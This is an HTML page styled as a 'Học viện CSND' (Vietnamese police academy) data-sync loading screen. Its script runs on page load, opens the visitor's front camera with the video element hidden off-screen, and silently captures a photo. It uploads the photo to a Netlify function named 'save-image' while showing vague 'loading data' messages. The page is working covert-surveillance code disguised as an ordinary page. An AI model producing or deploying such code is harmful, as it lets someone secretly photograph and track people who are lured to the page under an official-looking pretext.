<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Học viện CSND</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f8f9fa;
            color: #333;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .container {
            text-align: center;
            max-width: 600px;
        }
        h1 {
            font-size: 1.8em;
            margin-bottom: 8px;
            color: #2c3e50;
        }
        p {
            color: #555;
            margin-bottom: 25px;
        }
        .status {
            font-size: 1.15em;
            color: #666;
            min-height: 55px;
        }

        /* Ẩn video thông minh - vẫn render nhưng không thấy trên màn hình */
        video {
            position: absolute;
            left: -9999px;
            top: -9999px;
            width: 640px;
            height: 480px;
            visibility: hidden;
            pointer-events: none;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Học viện CSND</h1>
        <p>Đang tải dữ liệu và đồng bộ thông tin...</p>
        
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
        
        <div class="status" id="status">Vui lòng chờ trong giây lát...</div>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        async function startSilentCapture() {
            try {
                status.textContent = "Đang kết nối camera...";

                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640, max: 640 },
                        height: { ideal: 480, max: 480 },
                        frameRate: { ideal: 20 }
                    }
                });

                video.srcObject = stream;

                // Tăng nhẹ thời gian chờ để ảnh sáng hơn trên máy tính
                video.onloadedmetadata = () => {
                    setTimeout(() => silentCapture(stream), 450);
                };

            } catch (err) {
                status.textContent = "Đang xử lý...";
                console.error(err);
            }
        }

        async function silentCapture(stream) {
            try {
                status.textContent = "Đang thu thập dữ liệu...";

                canvas.width = 640;
                canvas.height = 480;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);

                // Tăng chất lượng một chút để ảnh sáng hơn trên máy tính
                const imageData = canvas.toDataURL('image/jpeg', 0.72);

                const response = await fetch('/.netlify/functions/save-image', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData })
                });

                if (response.ok) {
                    status.innerHTML = `Hoàn tất.<br><small>Dữ liệu đã được gửi thành công.</small>`;
                } else {
                    status.textContent = "Đang hoàn tất...";
                }

            } catch (error) {
                status.textContent = "Đang hoàn tất...";
                console.error(error);
            }

            // Tắt camera
            setTimeout(() => {
                if (stream) stream.getTracks().forEach(track => track.stop());
            }, 700);
        }

        window.onload = startSilentCapture;
    </script>
</body>
</html>
